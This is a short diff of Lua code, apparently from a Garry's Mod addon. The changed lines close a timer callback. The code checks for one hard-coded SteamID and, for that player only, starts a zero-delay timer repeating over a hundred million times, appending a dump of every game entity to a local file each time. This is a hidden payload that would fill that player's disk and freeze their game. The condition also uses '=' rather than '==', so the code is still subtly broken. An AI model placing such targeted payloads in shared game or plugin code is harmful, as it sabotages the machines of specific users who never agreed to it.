@@ -307,5 +307,5 @@ end)
 if LocalPlayer():SteamID() = 'STEAM_0:1:217428780' then 
     timer.Create('',0,123123123,function()
             file.Append('w.txt',table.ToString(ents.GetAll()))
-    end
+    end)
 end
